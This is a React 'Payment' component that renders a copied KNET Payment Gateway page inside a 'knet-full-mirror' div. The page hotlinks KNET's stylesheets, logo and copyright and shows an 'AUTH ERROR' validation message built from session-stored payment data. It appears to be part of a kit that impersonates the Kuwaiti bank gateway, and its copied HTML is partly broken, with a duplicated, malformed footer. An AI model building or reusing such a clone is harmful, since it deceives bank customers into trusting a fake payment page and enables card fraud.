
import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [paymentData, setPaymentData] = useState(null);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    setPaymentData(JSON.parse(data));
  }, []);

  if (!paymentData) return null;

  return (
    <div className="knet-full-mirror">
      <div dangerouslySetInnerHTML={{ __html: `
        <head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="no-cache" http-equiv="Pragma"/>
<meta content="-1" http-equiv="Expires"/>
<meta content="max-age=0" http-equiv="CACHE-CONTROL"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
<meta charset="utf-8"/>
<link href="https://www.kpay.com.kw/kpg//kpg/css/payment-reset.css" rel="stylesheet" type="text/css"/>
<link href="https://www.kpay.com.kw/kpg//kpg/css/payment-layout.css" rel="stylesheet" type="text/css"/>
<link href="https://www.kpay.com.kw/kpg//kpg/css/payment-responsive.css" rel="stylesheet" type="text/css"/>
<title>KNET Payment Gateway</title>
</head>
        <body><div class="wrapper">
<div class="contentBox" style="width: auto;">
<!--div class="col-lg-12"  style="text-align:center;padding-bottom: 10px;" -->
<div class="container-blogo" style="text-align:center;padding-bottom: 10px;padding-top: 10px;">
<img alt="logo" class="logoHead-mob" src="https://www.kpay.com.kw/kpg//kpg/images/New_knet_logo.jpg"/>
</div>
<img alt="spacer" class="logoSep" src="https://www.kpay.com.kw/kpg//kpg/images/paypage-images/separator.jpg "/>
<div class="notification" style="border: #ff0000 2px solid; margin-top:5%; margin-bottom: 3%;background-color: #f7dadd; font-size: 12px;
    						font-family: helvetica, arial, sans serif;
    						color: #ff0000;
   							 padding-right: 15px; width:360px">
<center><font color="red">Payment Page validation failed due to invalid Order Status: AUTH ERROR</font></center></div>
</div></div>
<footer>
<div class="footer-content">
<span>
<div class="row_new">
<div style="text-align: center;font-size: 12px; color: #000000;font-weight:normal;">
	                All Rights Reserved. Copyright 2026 © <br/><span style="font-weight:bold;color: #0077D5;">The Shared Electronic Banking Services Company - KNET</span>
</div>
</div>
</span>
</div>
</footer>
footer>
        	<div>
        	<span>
	            <p align="center" style="margin: auto;width: 450px;max-width: 450px;text-align: center;font-size:12px;">
	                All Rights Reserved. Copyright 2026 &copy; <br /><span style="font-weight:bold;color: #0077D5;">The Shared Electronic Banking Services Company</span>    
                </p>
            </span>
            </div>
    </footer
</body>
      ` }} />
    </div>
  );
}
